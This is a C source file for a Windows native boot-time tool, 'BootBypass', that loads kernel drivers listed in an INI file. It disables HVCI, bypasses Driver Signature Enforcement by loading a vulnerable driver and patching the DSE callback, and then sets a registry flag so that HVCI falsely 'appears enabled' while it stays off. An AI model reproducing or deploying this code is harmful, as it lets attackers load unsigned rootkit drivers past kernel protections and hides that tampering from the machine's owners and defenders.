#include "BootManager.h"

static ULONGLONG g_OriginalCallback = 0;

__declspec(noreturn) void __stdcall NtProcessStartup(void* Peb) {
    INI_ENTRY entries[MAX_ENTRIES];
    CONFIG_SETTINGS config;
    ULONG entryCount, i;
    PWSTR iniContent = NULL;
    NTSTATUS status;
    BOOLEAN bOld;
    BOOLEAN skipPatch;

    // Enable required privileges for driver/file operations
    RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bOld);
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bOld);

    DisplayMessage(L"BootBypass - Modular Driver Loader\r\n====================================\r\n");

    // Load configuration file
    if (!ReadIniFile(L"\\??\\C:\\Windows\\drivers.ini", &iniContent)) {
        DisplayMessage(L"ERROR: drivers.ini not found\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Parse INI entries and global config
    entryCount = ParseIniFile(iniContent, entries, MAX_ENTRIES, &config);

    // Check if execution is enabled in config
    if (!config.Execute) {
        DisplayMessage(L"EXECUTION DISABLED in Config. Exiting.\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Validate parsed entries
    if (entryCount == 0) {
        DisplayMessage(L"ERROR: No INI entries\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Check HVCI status and disable if needed (triggers reboot if active)
    skipPatch = CheckAndDisableHVCI();

    // Restore saved DSE callback address from previous run (if exists)
    if (g_OriginalCallback == 0) LoadStateSection(&g_OriginalCallback);

    // Process all INI entries sequentially
    for (i = 0; i < entryCount; i++) {
        // Skip empty entries
        if (entries[i].ServiceName[0] == 0 && entries[i].DisplayName[0] == 0) continue;
        
        DisplayMessage(L"\r\n["); DisplayMessage(entries[i].DisplayName); DisplayMessage(L"]\r\n");

        // Skip autopatch operations if waiting for HVCI reboot
        if (skipPatch && entries[i].AutoPatch) {
            DisplayMessage(L"SKIPPED: Waiting for HVCI reboot\r\n");
            continue;
        }

        switch (entries[i].Action) {
            case ACTION_LOAD:
                if (entries[i].AutoPatch) {
                    // Full DSE bypass sequence: load vuln driver -> patch -> load target -> restore
                    ExecuteAutoPatchLoad(&entries[i], &config, &g_OriginalCallback);
                } else {
                    // Standard driver load without DSE patching
                    if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
                        DisplayMessage(L"SKIPPED: Already loaded\r\n");
                    } else {
                        status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath, entries[i].DriverType, entries[i].StartType);
                        if (NT_SUCCESS(status) || status == STATUS_IMAGE_ALREADY_LOADED) DisplayMessage(L"SUCCESS: Driver loaded\r\n");
                        else { DisplayMessage(L"FAILED: Load error"); DisplayStatus(status); }
                    }
                }
                break;

            case ACTION_UNLOAD:
                // Unload kernel driver
                if (!IsDriverLoaded(entries[i].ServiceName)) DisplayMessage(L"SKIPPED: Not loaded\r\n");
                else {
                    status = UnloadDriver(entries[i].ServiceName);
                    if (NT_SUCCESS(status)) DisplayMessage(L"SUCCESS: Unloaded\r\n");
                    else { DisplayMessage(L"FAILED: Unload error"); DisplayStatus(status); }
                }
                break;

            case ACTION_RENAME:
                // Rename file or directory
                ExecuteRename(&entries[i]);
                break;

            case ACTION_DELETE:
                // Delete file or directory (recursive if configured)
                ExecuteDelete(&entries[i]);
                break;
        }
    }

    DisplayMessage(L"\r\n====================================\r\n");

    // Restore HVCI in SYSTEM hive if configured (physical restoration)
    if (!skipPatch && config.RestoreHVCI) RestoreHVCI();

    // Set cosmetic HVCI registry flag (system hive remains patched to 0)
    if (!skipPatch) {
        DisplayMessage(L"INFO: Setting cosmetic HVCI registry flag...\r\n");
        if (NT_SUCCESS(SetHVCIRegistryFlag(TRUE))) {
            DisplayMessage(L"SUCCESS: HVCI appears enabled (registry only)\r\n");
        }
    }
    
    NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    __assume(0);
}